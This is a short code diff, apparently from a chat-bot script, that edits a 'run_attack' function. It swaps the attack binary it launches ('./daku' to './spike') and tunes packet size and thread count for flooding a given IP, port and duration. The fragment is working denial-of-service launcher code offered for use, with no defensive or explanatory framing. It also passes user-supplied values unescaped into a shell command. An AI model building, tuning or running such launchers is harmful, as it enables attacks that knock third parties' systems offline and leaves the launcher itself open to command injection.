@@ -58,12 +58,12 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     # Fixed parameters for packet size and threads
-    packet_size = 7  # Set your desired packet size
-    threads = 900         # Set your desired number of threads
+    packet_size = 6  # Set your desired packet size
+    threads = 811         # Set your desired number of threads
 
     try:
         # Command with fixed parameters
-        command = f"./daku {ip} {port} {duration} {packet_size} {threads}"
+        command = f"./spike {ip} {port} {duration} {packet_size} {threads}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
